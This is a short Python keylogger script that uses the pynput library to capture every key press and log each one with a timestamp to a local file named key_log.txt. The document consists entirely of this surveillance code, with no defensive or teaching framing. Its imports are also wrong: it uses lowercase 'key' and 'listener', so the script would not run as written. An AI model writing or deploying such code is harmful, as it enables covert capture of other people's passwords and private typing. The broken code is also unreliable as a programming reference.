from pynput.keyboard import key, listener
import logging
import time

logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.debug(key)
    
with listener(on_press=on_press) as l:
    l.join()